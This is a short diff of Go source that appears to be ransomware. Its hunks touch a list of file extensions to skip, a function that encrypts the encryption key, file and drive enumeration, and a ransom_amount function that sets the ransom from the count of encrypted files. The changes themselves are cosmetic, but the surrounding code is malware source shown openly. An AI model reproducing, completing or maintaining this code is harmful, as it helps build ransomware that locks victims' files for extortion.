@@ -50,7 +50,7 @@ var ext_blacklist = []string{
 	"ini",
 	"img",
 	"xml",
-	"old", // lisandro : do i keep this ?
+	"old",
 	"386",
 	"adv",
 	"ani",
@@ -233,7 +233,7 @@ func encrypt_encryption_key(k []byte) []byte {
 	if err != nil {
 		panic(err)
 	}
-	return encryptedBytes;
+	return encryptedBytes
 }
 
 func rand_str(str_size int) string {
@@ -443,7 +443,7 @@ func get_all_files()([]string){
 			}
 		}
 	}
-	return all_files
+	return all_files;
 }
 
 func get_drives() (r []string){
@@ -497,7 +497,7 @@ func check_ext(file string) bool{
 	return false
 }
 
-func ransom_amount(files_encrypted int) int{
+func ransom_amount(files_encrypted int) (int) {
 	return int(float32(files_encrypted) * 1.25)
 }
 
